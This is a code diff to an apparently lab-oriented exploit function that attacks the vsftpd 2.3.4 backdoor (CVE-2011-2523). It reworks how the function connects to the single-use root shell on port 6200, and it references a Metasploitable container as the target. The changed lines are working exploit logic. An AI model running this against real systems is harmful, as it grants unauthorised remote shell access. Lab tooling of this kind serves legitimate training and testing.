@@ -4240,23 +4240,26 @@ async def exploit_vsftpd_234(target: str, sid: str) -> dict:
         return {"ok": False, "error": f"Could not reach FTP on port 21: {e}",
                 "cve": "CVE-2011-2523"}
 
-    # Step 3 — wait for port 6200 to bind (up to 10 sec)
+    # Step 3+4 — connect directly to the backdoor in a retry loop. We DO NOT
+    # pre-check the port with a separate socket because the vsftpd 2.3.4 backdoor
+    # accepts exactly ONE connection. A throwaway check would consume the slot
+    # and the real connect would then see "connection refused".
     backdoor_port = 6200
-    bound = False
+    reader = writer = None
+    last_err = None
     for _ in range(20):
-        if _xpl_port_open(target, backdoor_port, timeout=1):
-            bound = True; break
-        await asyncio.sleep(0.5)
-    if not bound:
+        try:
+            reader, writer = await asyncio.open_connection(target, backdoor_port)
+            break
+        except Exception as e:
+            last_err = e
+            await asyncio.sleep(0.5)
+    if reader is None:
         return {"ok": False,
-                "error": "Smile-trigger sent but port 6200 never bound. The backdoor may have already been triggered this session — restart with: docker restart lab_metasploitable",
-                "cve": "CVE-2011-2523"}
-
-    # Step 4 — connect to the backdoor shell
-    try:
-        reader, writer = await asyncio.open_connection(target, backdoor_port)
-    except Exception as e:
-        return {"ok": False, "error": f"Port 6200 is open but connection refused: {e}",
+                "error": (f"Backdoor never bound on port 6200 (last error: {last_err}). "
+                          f"vsftpd 2.3.4's backdoor is single-use per daemon — if a previous "
+                          f"exploit attempt already consumed it, restart the container: "
+                          f"`docker restart lab_metasploitable`"),
                 "cve": "CVE-2011-2523"}
 
     # Step 5 — VERIFY the shell is alive (send `id`, expect `uid=`)
